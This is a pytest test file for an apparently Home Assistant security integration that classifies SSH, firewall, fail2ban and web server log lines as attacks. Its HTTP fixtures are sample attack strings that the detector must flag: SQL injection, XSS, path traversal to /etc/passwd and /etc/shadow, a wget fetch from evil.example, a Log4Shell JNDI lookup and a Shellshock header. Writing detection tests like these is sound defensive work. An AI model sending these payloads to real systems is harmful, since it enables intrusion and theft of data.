"""Tests for the log classification rules."""

from __future__ import annotations

import pytest

from custom_components.ha_sentinel.engine.models import AttackType, Severity
from custom_components.ha_sentinel.engine.rules import (
    classify_http_request,
    parse_access_log_line,
    parse_ha_auth_message,
    parse_line,
    strip_syslog_header,
)

NGINX = '203.0.113.7 - - [10/Nov/2026:13:55:36 -0300] "{req}" {status} 512 "-" "{ua}"'


def nginx(path: str, ua: str = "Mozilla/5.0", status: int = 404, method: str = "GET") -> str:
    return NGINX.format(req=f"{method} {path} HTTP/1.1", status=status, ua=ua)


# --- Home Assistant -------------------------------------------------------


def test_ha_invalid_auth_current_format() -> None:
    msg = (
        "Login attempt or request with invalid authentication from "
        "scan.example.net (198.51.100.23). Requested URL: '/auth/login_flow/abc'. "
        "(Mozilla/5.0 (X11; Linux x86_64))"
    )
    result = parse_ha_auth_message(msg)
    assert result is not None
    assert result.attack_type is AttackType.FAILED_LOGIN
    assert result.ip == "198.51.100.23"
    assert result.target == "/auth/login_flow/abc"
    assert "X11" in (result.details or "")


def test_ha_invalid_auth_with_quote_in_url_is_escalated() -> None:
    msg = (
        "Login attempt or request with invalid authentication from 198.51.100.9 "
        "(198.51.100.9). Requested URL: '/api/states?x=1' OR '1'='1'. (None)"
    )
    result = parse_ha_auth_message(msg)
    assert result is not None
    assert result.attack_type is AttackType.SQL_INJECTION
    assert result.ip == "198.51.100.9"


def test_ha_invalid_auth_legacy_format() -> None:
    result = parse_ha_auth_message("Login attempt or request with invalid authentication from 192.0.2.4")
    assert result is not None and result.ip == "192.0.2.4"


def test_ha_banned_ip() -> None:
    result = parse_ha_auth_message("Banned IP 192.0.2.50 for too many login attempts")
    assert result is not None
    assert result.attack_type is AttackType.BANNED_IP


# --- SSH ------------------------------------------------------------------


@pytest.mark.parametrize(
    ("line", "expected", "user"),
    [
        (
            "Nov 10 13:00:01 host sshd[123]: Failed password for root from 203.0.113.5 port 52314 ssh2",
            AttackType.FAILED_LOGIN,
            "root",
        ),
        (
            "Nov 10 13:00:01 host sshd[123]: Invalid user admin from 203.0.113.5 port 52314",
            AttackType.FAILED_LOGIN,
            "admin",
        ),
        (
            "Nov 10 13:00:01 host sshd[9]: error: maximum authentication attempts exceeded for root from 203.0.113.5 port 1 ssh2 [preauth]",
            AttackType.BRUTE_FORCE,
            "root",
        ),
        (
            "Nov 10 13:00:01 host sshd[9]: Did not receive identification string from 203.0.113.5 port 4444",
            AttackType.SCANNER,
            None,
        ),
    ],
)
def test_ssh(line: str, expected: AttackType, user: str | None) -> None:
    result = parse_line(line)
    assert result is not None
    assert result.attack_type is expected
    assert result.ip == "203.0.113.5"
    assert result.username == user


def test_ssh_failed_for_invalid_user_not_double_counted() -> None:
    line = "sshd[1]: Failed password for invalid user admin from 203.0.113.5 port 22 ssh2"
    assert parse_line(line) is None


def test_ssh_accepted_is_ignored() -> None:
    assert parse_line("sshd[1]: Accepted publickey for denis from 192.168.1.10 port 5 ssh2") is None


# --- Firewall / fail2ban ----------------------------------------------------


def test_ufw_block() -> None:
    line = (
        "Nov 10 13:00:01 host kernel: [UFW BLOCK] IN=eth0 OUT= MAC=aa SRC=198.51.100.77 "
        "DST=192.168.1.2 LEN=44 PROTO=TCP SPT=40000 DPT=23 WINDOW=1024"
    )
    result = parse_line(line)
    assert result is not None
    assert result.attack_type is AttackType.FIREWALL_BLOCK
    assert result.ip == "198.51.100.77"
    assert result.port == 23


def test_ufw_allow_ignored() -> None:
    line = "kernel: [UFW ALLOW] IN=eth0 OUT= SRC=192.168.1.5 DST=192.168.1.2 PROTO=TCP DPT=22"
    assert parse_line(line) is None


def test_pfsense_filterlog_block() -> None:
    line = (
        "Nov 10 13:00:01 pfsense filterlog[1]: 5,,,1000000103,igb0,match,block,in,4,0x0,,"
        "244,54321,0,none,6,tcp,40,198.51.100.8,203.0.113.1,51234,3389,0,S,1,,1024,,"
    )
    result = parse_line(line)
    assert result is not None
    assert result.attack_type is AttackType.FIREWALL_BLOCK
    assert result.ip == "198.51.100.8"
    assert result.port == 3389


def test_fail2ban_ban() -> None:
    line = "2026-11-10 13:00:01,123 fail2ban.actions [1]: NOTICE  [sshd] Ban 203.0.113.9"
    result = parse_line(line)
    assert result is not None
    assert result.attack_type is AttackType.BANNED_IP
    assert result.target == "sshd"


# --- HTTP -----------------------------------------------------------------


@pytest.mark.parametrize(
    ("path", "ua", "expected"),
    [
        ("/index.php?id=1%20UNION%20SELECT%20password%20FROM%20users", "", AttackType.SQL_INJECTION),
        ("/search?q=1'%20OR%20'1'='1", "", AttackType.SQL_INJECTION),
        ("/?q=%3Cscript%3Ealert(1)%3C/script%3E", "", AttackType.XSS),
        ("/static/..%2f..%2f..%2fetc/passwd", "", AttackType.PATH_TRAVERSAL),
        ("/static/%252e%252e%252fetc%252fpasswd", "", AttackType.PATH_TRAVERSAL),
        ("/cgi?cmd=;wget%20http://evil.example/x.sh", "", AttackType.COMMAND_INJECTION),
        ("/", "${jndi:ldap://evil.example/a}", AttackType.LOG4SHELL),
        ("/cgi-bin/status", "() { :; }; /bin/bash -c 'id'", AttackType.SHELLSHOCK),
        ("/.env", "", AttackType.SENSITIVE_FILE_PROBE),
        ("/wp-login.php", "", AttackType.SENSITIVE_FILE_PROBE),
        ("/", "sqlmap/1.7.2#stable (https://sqlmap.org)", AttackType.SCANNER),
    ],
)
def test_http_classification(path: str, ua: str, expected: AttackType) -> None:
    result = parse_access_log_line(nginx(path, ua or "-"))
    assert result is not None, path
    assert result.attack_type is expected
    assert result.ip == "203.0.113.7"


@pytest.mark.parametrize(
    "path",
    [
        "/",
        "/api/websocket",
        "/lovelace/0",
        "/api/history/period/2026-11-10T00:00:00?filter_entity_id=sensor.x",
        "/static/translations/pt-BR.json",
        "/api/camera_proxy/camera.front_door?token=abc123",
        "/hacsfiles/button-card/button-card.js",
    ],
)
def test_http_benign(path: str) -> None:
    assert parse_access_log_line(nginx(path, status=200)) is None


def test_most_severe_match_wins() -> None:
    result = classify_http_request("/x.php?a=../../etc/passwd;cat%20/etc/shadow")
    assert result is not None
    assert result.attack_type is AttackType.COMMAND_INJECTION
    assert result.severity is Severity.CRITICAL
    assert AttackType.PATH_TRAVERSAL in result.matches


def test_malformed_request_line() -> None:
    line = '203.0.113.7 - - [10/Nov/2026:13:55:36 -0300] "\\x16\\x03\\x01\\x00" 400 157 "-" "-"'
    result = parse_access_log_line(line)
    assert result is not None
    assert result.attack_type is AttackType.SUSPICIOUS_REQUEST


def test_strip_syslog_header() -> None:
    assert strip_syslog_header("<38>Nov 10 13:00:01 host sshd[1]: x") == "Nov 10 13:00:01 host sshd[1]: x"
    assert strip_syslog_header("<165>1 2026-11-10T13:00:01Z host app - - - x").startswith("2026")
